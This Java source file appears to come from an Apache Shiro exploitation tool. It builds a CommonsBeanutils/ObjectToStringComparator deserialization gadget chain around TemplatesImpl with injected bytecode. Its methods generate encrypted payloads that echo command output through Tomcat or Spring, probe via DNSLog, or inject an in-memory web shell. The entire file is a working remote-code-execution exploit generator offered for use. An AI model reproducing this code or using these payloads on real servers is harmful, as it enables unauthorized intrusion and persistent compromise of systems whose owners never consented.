package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * CommonsBeanutilsObjectToStringComparator 利用链
 * 使用 Apache Commons Lang3 的 ObjectToStringComparator 作为比较器
 * 兼容 commons-beanutils 1.9.2
 */
public class CommonsBeanutilsObjectToStringComparator {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 构造 CBObjectToString 链 payload
     * @param templatesImpl TemplatesImpl 对象
     * @return 反序列化 payload
     */
    private byte[] getPayload(TemplatesImpl templatesImpl) throws Exception {
        // 创建 ObjectToStringComparator 实例
        ObjectToStringComparator stringComparator = new ObjectToStringComparator();

        // 创建 BeanComparator，使用 ObjectToStringComparator 作为比较器
        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

        // 创建 PriorityQueue
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

        // 添加 ObjectToStringComparator 对象
        queue.add(stringComparator);
        queue.add(stringComparator);

        // 通过反射替换 queue 内容为 TemplatesImpl 对象
        setFieldValue(queue, "queue", new Object[]{templatesImpl, templatesImpl});

        // 修改 property 为 outputProperties 以触发 getter
        setFieldValue(beanComparator, "property", "outputProperties");

        // 序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    /**
     * 生成回显 payload
     * @param echoType 回显类型
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 根据回显类型生成恶意类
        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);
        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);
        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);
        } else if (echoType.equals("DNSLogEchoSpring")) {
            // DNSLog 探测（Spring 版本）
            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
            ctClass = dnsLogEchoSpring.genPayload(pool);
        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsObjectToStringComparator().getPayload(templatesImpl);
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.CBC_Encrypt(key, data);
    }

    /**
     * 生成内存马 payload
     * @param key 密钥
     * @return 加密后的 payload 字符串
     */
    public static String genMemPayload(String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemInject 作为内存马注入器
        MemInject memInject = new MemInject();
        ctClass = memInject.genPayload(pool);

        // 设置父类为 AbstractTranslet
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        // 创建 TemplatesImpl 对象
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        // 生成反序列化 payload
        byte[] payload = new CommonsBeanutilsObjectToStringComparator().getPayload(templatesImpl);
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.CBC_Encrypt(key, data);
    }
}
